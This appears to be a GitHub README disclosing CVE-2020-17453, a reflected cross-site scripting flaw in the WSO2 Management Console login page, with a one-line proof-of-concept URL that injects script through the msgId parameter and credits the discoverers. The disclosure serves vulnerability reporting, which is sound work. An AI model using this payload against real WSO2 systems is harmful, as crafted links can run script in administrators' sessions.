<h1 align="center">
  <br>
  <a href="https://github.com/JHHAX/CVE-2020-17453"><img src="https://i.ibb.co/XsLC8KS/download-1.png" alt="CVE"></a>
  
  
  <br>
  
  
  
  CVE-2020-17453
  
  
  
  <br>
</h1>

WSO2 Management Console through 5.10 allows XSS via the carbon/admin/login.jsp msgId parameter.

![PoC](https://github.com/JHHAX/CVE-2020-17453/blob/master/PoC.png)

## PoC (Proof of Concept)
```
https://<company>.com/carbon/admin/login.jsp?msgId=%27;alert(1)//
```

## Discoverers

Name: Jackson Henry

Twitter: [@JacksonHHax](https://twitter.com/JacksonHHax)

Name: Nicholas Young

